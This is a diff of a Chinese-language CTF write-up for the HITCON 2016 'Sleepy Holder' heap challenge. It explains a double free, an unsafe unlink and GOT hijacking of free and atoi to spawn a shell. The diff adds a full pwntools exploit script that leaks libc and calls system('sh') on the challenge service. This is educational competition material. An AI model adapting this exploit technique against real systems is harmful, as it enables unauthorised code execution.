@@ -1,25 +1,22 @@
 title: '[HITCON CTF 2016 Quals] Sleepy Holder 300'
 author: Naetw
 tags:
+  - HITCON CTF 2016
   - pwn
   - heap
-  - HITCON CTF 2016
-  - Unlink
+  - unlink
   - GOT hijacking
 categories:
   - write-ups
 date: 2016-10-15 22:30:00
 ---
-## Info
-> Category: pwn		
-> Point: 300
-> Author: Naetw @ BambooFox
 
-這題是看了 **meh** 的 writeup 提示才解出來的，heap 真是太深奧了QQ
+## Description
 
-<!-- more -->
+> 這題是看了 **meh** 的 writeup 提示才解出來的，heap 真是太深奧了QQ
 
 ## Analyzing
+
 64 bit ELF, NX, Partial RELRO, Stack Canary, no PIE
 一開始會給三個選單：
 
@@ -38,42 +35,40 @@ date: 2016-10-15 22:30:00
 keep
 ----
 
-~~~c
+```c
 if(!buf_in_use){
 	buf = calloc(1, size_of_kind);
 	buf_in_use = 1;
 	puts("Tell me your secret: ");
 	read(0, buf, size_of_kind);
 }
-~~~
+```
+
 keep 會問你要保存什麼樣的秘密，接著檢查是不是已經分配過了，如果沒有則根據 small(40), big(4000), huge(400000)，不同選擇來分配大小，之後可以 read 進該 size 的長度的 payload。但是 huge secret 只能夠 `calloc` 一次，之後就不能再動了。
 
 global buffer 上有三個 address 來存放這些 malloc 得到的記憶體位置，分別稱它為 `small_buf`, `big_buf`, `huge_buf`，除了這些之外，global buffer上還有 3 個 4bytes 的 buffer，來記錄這幾種秘密是不是 inuse。
 
-wipe
-----
+* wipe
 
-~~~c
+```c
 free(buf);
 buf_in_use = 0;
-~~~
+```
 
 這兩行 code 就很一般的 `free` 掉空間然後 inuse 清成 0。但是很重要的是這裡不會檢查是不是 not in use，而直接 `free` 掉。再來是 `free` 掉之後也不會把 buf 清成 NULL，global buffer 上會依舊指著剛剛 `calloc()` 的 address。如上面剛剛說的 huge secret 是不能 `free` 掉的。
 
-renew
------
+* renew
 
-~~~c
+```c
 if(buf_in_use){
 	puts("Tell me your secret: ");
 	read(0, buf, size_of_kind);	
 }
-~~~
+```
 
 這裡就很簡單的可以重新讀東西進 buffer 裡。
 
-攻擊手法：
----------
+## Exploit:
 
 利用 unlink 來造成任意 address 的寫入。不過這邊需要知道一點：
 
@@ -92,7 +87,7 @@ if(buf_in_use){
 
 至於為什麼需要它放進 small bin 裡，原因是當初 `malloc` big chunk 的時候有把 big chunk 的 inuse bit 設成 1，我沒記錯的話是 default 都是 1，有 `free` 掉前面 chunk 才會被設成 0，被設成 1 的 code 如下：
 
-~~~c
+```c
 if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
 {
 	remainder_size = size - nb;
@@ -107,13 +102,13 @@ if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
 	alloc_perturb (p, bytes);
 	return p;
 }
-~~~
+```
 
 在 `set_head` 的 macro 那邊，把 `nb` 跟 `PREV_INUSE` 做 `or`，而 `PREV_INUSE` 是一個 macro define 0x1。
 
 所以當我們 malloc huge request 後，在進行 consolidate 的時候，因為他要把 small chunk 回收，這時候他會利用 small chunk 的 size 找到下一個 chunk，把下一個 chunk 的 inuse bit 拔掉：
 
-~~~c
+```c
 if (nextchunk != av->top) {
 	nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
 	
@@ -122,7 +117,7 @@ if (!nextinuse) {
 	unlink(av, nextchunk, bck, fwd);
 } else
 	clear_inuse_bit_at_offset(nextchunk, 0);
-~~~
+```
 
 在那個 `clear_inuse_bit_at_offest` 就會把 big chunk 的 inuse bit 拔掉，這樣等等才能夠進行 unsafe unlink。
 
@@ -133,7 +128,7 @@ if (!nextinuse) {
 
 這裡為什麼要再一次 `free(small)` 呢，是因為如果直接 keep small 的話，他會先看 fastbin 裡面有沒有可以用的 chunk，但是在剛剛 keep huge 時已經把 之前的 small chunk 回收，所以 fastbin 現在是空的，在 fastbin 裡沒東西的話他會去 smallbin 裡找，這時如果成功 allocate 的話，之前的 big chunk inuse bit 又會被設成 1 了，這樣等等就無法進行 unsafe unlink，這段 code 如下：
 
-~~~c
+```c
 if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
 {
 idx = fastbin_index (nb);
@@ -146,11 +141,11 @@ idx = fastbin_index (nb);
 			break;
 	}
 while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim))
-~~~
+```
 
 這裡會檢查 request size 是 fastbin 的範圍但是因為 fastbin 裡面沒有東西，所以那個 victim 會是 NULL，會 break 跳到 smallbin 那裡去要空間：
 
-~~~c
+```c
 if (in_smallbin_range (nb))
 {
 	idx = smallbin_index (nb);
@@ -171,7 +166,7 @@ if (in_smallbin_range (nb))
 			set_inuse_bit_at_offset (victim, nb);
 			.....
 		}
-~~~
+```
 
 在最下面可以看到這時候 victim 拿到之前放進 smallbin 裡的 第一次 small chunk address，但是他會利用 size 也就是 nb 把 big chunk inuse bit 設成 1。
 
@@ -181,7 +176,7 @@ if (in_smallbin_range (nb))
 
 這裡 keep small 時輸入的 input 就可以開始偽造 fake chunk 了，payload 如下：
 
-~~~python
+```python
 fake_fd = 0x6020d0-0x18
 fake_bk = 0x6020d0-0x10
 payload = ""
@@ -190,32 +185,33 @@ payload += p64(0x21) # fake chunk size
 payload += p64(fake_fd)
 payload += p64(fake_bk)
 payload += p64(0x20) # fake previous size for big chunk
-~~~
+```
 
 因為等等會利用 wipe(big) 來進行 unlink 所以這裡我們需要的任意 address 位置就把它設在 `0x6020d0` 也就是 global buffer 上的 small_buf 的位置，才能進行 renew。在這裡利用 payload 把 small chunk 可寫的地方當成另一個 chunk，然後 fake big chunk 的 previous size 這樣他在進行 unlink 才會找到我們偽造的 fd 跟 bk。
 
 7. wipe(big) # trigger unlink
 
-此時 `0x6020d0` 的位置，也就是 small_buf 的位置已經指到 global buffer 上了，後面就是利用 renew 來進行任意位置讀寫。
-~~~assembly
+此時 `0x6020d0` 的位置，也就是 small_buf 的位置已經指到 global buffer 上了，後面就是利用 renew 來進行任意位置讀寫
+
+```assembly
 0x6020b0:       0x00007f388c24f620      0x0000000000000000
 0x6020c0:       0x00000000007fe9d0      0x00007f388c3e4010
 0x6020d0:       0x00000000006020b8      0x0000000100000000
 0x6020e0:       0x0000000000000001      0x0000000000000000
-~~~
+```
 
 8. renew(small)
 
 payload :
 
-~~~python
+```python
 payload = ""
 payload += p64(0x0) # padding
 payload += p64(free_got) # big_buf
 payload += p64(0x0)
 payload += p64(0x6020c0) # for write arbitrary
 payload += p32(1)*3 # let us be easy to renew
-~~~
+```
 
 在這裡我們把 `big_buf` 指到了 `free` 的 GOT entry，把 `small_buf` 指到了 `&big_buf`，之後好二次寫入，後面的 p32(1)*3 是為了讓 buf inuse 設成 1 才能進行 renew。
 
@@ -225,10 +221,10 @@ payload += p32(1)*3 # let us be easy to renew
 
 payload :
 
-~~~python
+```python
 puts_plt = 0x400760
 payload = p64(puts_plt)*2
-~~~
+```
 
 10. renew(small) 
 11. wipe(big)
@@ -237,13 +233,13 @@ payload = p64(puts_plt)*2
 
 payload :
 
-~~~python
+```python
 payload = ""
 payload += p64(atoi_got)
 payload += p64(0x0)
 payload += p64(0x6020c0) # address of big_buf
 payload += p32(1)*3
-~~~
+```
 
 12. renew(small)
 13. renew(big)
@@ -252,13 +248,13 @@ payload += p32(1)*3
 
 payload:
 
-~~~python
+```python
 payload = ""
 payload += p64(atoi_got)
 payload += p64(0x0)
 payload += p64(0x6020c0)
 payload += p32(1)*3
-~~~
+```
 
 接著 renew(big) 把 atoi GOT hijack 成 system
 
@@ -266,6 +262,109 @@ payload += p32(1)*3
 
 就可以造成 atoi('sh') -> system('sh') 拿到 shell。
 
-[secret]: https://github.com/lattera/glibc/blob/master/malloc/malloc.c#L3397
+```python
+#!/usr/bin/env python
 
-<!-- more -->
+from pwn import *
+
+r = remote('127.0.0.1', 4000)
+#r = remote('52.68.31.117', 9547)
+
+secret_kind = {'small':'1', 'big':'2', 'huge':'3'}
+
+
+#libc = ELF('libc.so.6')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+atoi_got = 0x602080
+free_got = 0x602018
+puts_plt = 0x400766
+
+def keep(size, content):
+    r.recvuntil('3. Renew secret\n')
+    r.sendline('1')
+    r.recvuntil('2. Big secret\n')
+    r.sendline(secret_kind[size])
+    r.recvuntil('Tell me your secret:')
+    r.sendline(content)
+
+def wipe(size):
+    r.recvuntil('3. Renew secret\n')
+    r.sendline('2')
+    r.recvuntil('2. Big secret\n')
+    r.sendline(secret_kind[size])
+
+def renew(size, content):
+    r.recvuntil('3. Renew secret\n')
+    r.sendline('3')
+    r.recvuntil('2. Big secret\n')
+    r.sendline(secret_kind[size])
+    r.recvuntil('Tell me your secret:')
+    r.sendline(content)
+
+
+keep('small', 'AAAA')
+keep('big', 'BBBB') # keep big to prevent the small chunk to consolidate with top chunk
+wipe('small')
+
+# malloc secret: malloc big enough size, it will get fastbin chunk back, so it(previous small chunk) will be move into smallbin
+keep('huge', 'CCCC')
+
+# now we can free small chunk again, since it has been moved into smallbin, it will pass the check of double free
+# bypass double free, then we can put this chunk back to fastbin again
+# so that we won't let big chunk's previous in use bit to be set up
+wipe('small') 
+
+
+fake_fd = 0x6020d0-0x18
+fake_bk = 0x6020d0-0x10
+payload = ""
+payload += p64(0x0) + p64(0x21) # fake previous size and size
+payload += p64(fake_fd) + p64(fake_bk) # fake fb and bk to unlink
+payload += p64(0x20) # fake previous size 
+keep('small', payload)
+
+wipe('big') # to trigger unlink
+
+raw_input('#')
+
+payload = ""
+payload += p64(0x0) # padding
+payload += p64(free_got) # big_buf
+payload += p64(0x0)
+payload += p64(0x6020c0) # for write arbitrary
+payload += p32(1)*3 # let us be easy to renew
+renew('small', payload)
+
+renew('big', p64(puts_plt)*2) # hijack free to call puts, *2 to prevent origin puts broke
+
+payload = ""
+payload += p64(atoi_got)
+payload += p64(0x0)
+payload += p64(0x6020c0) # address of big_buf
+payload += p32(1)*3
+renew('small', payload)
+
+wipe('big')
+
+x = r.recvline()
+base = u64(x[:6].ljust(8,'\x00')) - libc.symbols['atoi']
+print hex(base)
+
+system = base + libc.symbols['system']
+
+payload = ""
+payload += p64(atoi_got)
+payload += p64(0x0)
+payload += p64(0x6020c0)
+payload += p32(1)*3
+renew('small',payload)
+
+renew('big', p64(system)) # GOT hijack
+
+r.recv()
+r.sendline('sh\x00')
+
+r.interactive()
+```
+
+[secret]: https://github.com/lattera/glibc/blob/master/malloc/malloc.c#L3397
